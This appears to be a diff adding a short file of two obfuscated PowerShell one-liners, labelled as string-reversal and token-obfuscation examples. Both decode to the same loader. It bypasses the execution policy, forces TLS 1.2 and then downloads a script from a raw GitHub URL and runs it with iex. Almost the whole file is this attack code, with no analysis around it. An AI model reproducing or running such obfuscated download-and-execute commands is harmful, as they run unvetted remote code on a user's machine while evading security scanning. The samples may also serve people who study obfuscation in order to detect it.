@@ -1,0 +1,7 @@
+1. Reverse entire command after concatenating
+
+" $(SeT-iTEm 'vaRiABlE:OFs'  '') "+ ( [STrINg] [rEGEX]::MatChes( "xEI |)93]rahC[,'1LI' eCAlpEr-  )')'+')'+'1LI1sp.msiriG'+'/nia'+'m/msi'+'riG/o'+'h'+'oZniMAI/moc.'+'tne'+'tnoc'+'resubu'+'ht'+'ig'+'.wa'+'r//:sp'+'tth1LI'+'(gnirtSdaolnw'+'oD.)tneilCb'+'eW.t'+'e'+'N.met'+'syS '+'t'+'ce'+'jbO-weN(( xei '+';2703 rob'+'- locot'+'orPytiruceS'+'::]rega'+'naM'+'tnioPecivreS.teN.m'+'et'+'syS[ = l'+'o'+'cotorPytiruce'+'S:'+':]rega'+'naM'+'tnioPe'+'civr'+'eS.teN.'+'me'+'tsy'+'S[ ;'+'e'+'croF-'+' ss'+'ecorP '+'ep'+'ocS- s'+'sapyB ycilo'+'P'+'noituc'+'exE-teS'(( " , '.' ,'R'+'Ig'+'httoL'+'eFt') | %{$_ })+"$( SET-ITeM 'variAble:OFs'  ' ' )" | & ( $enV:COmsPEc[4,15,25]-JoIN'')
+
+2. Token Obfuscation:
+
+ $ZfcJ8  = [TypE]("{7}{5}{2}{0}{3}{4}{1}{6}"-f'.SEr','ma','et','ViC','EpoinT','Em.n','NageR','SYsT')  ;&("{1}{4}{5}{2}{0}{3}" -f 'ionP','Se','xecut','olicy','t-','E') ("{0}{1}"-f 'Bypas','s') -Scope ("{2}{0}{1}"-f 'ce','ss','Pro') -Force;   $ZFcj8::"se`C`URITYpRoT`o`C`oL" =   $ZFCJ8::"SEc`URitYP`R`oTocOL" -bor 3072; &("{0}{1}"-f 'i','ex') ((&("{0}{3}{1}{2}"-f 'Ne','Objec','t','w-') ("{4}{2}{0}{3}{1}"-f 'm.Net','nt','te','.WebClie','Sys')).("{2}{0}{1}{4}{3}" -f'loa','d','Down','g','Strin').Invoke(("{13}{15}{4}{7}{3}{0}{11}{14}{5}{9}{16}{12}{17}{1}{8}{6}{10}{2}" -f'o','iris','s1','erc','u','m/I','/main/G','bus','m','AMinZ','irism.p','nt','ho','https://raw.gi','ent.co','th','o','/G')))
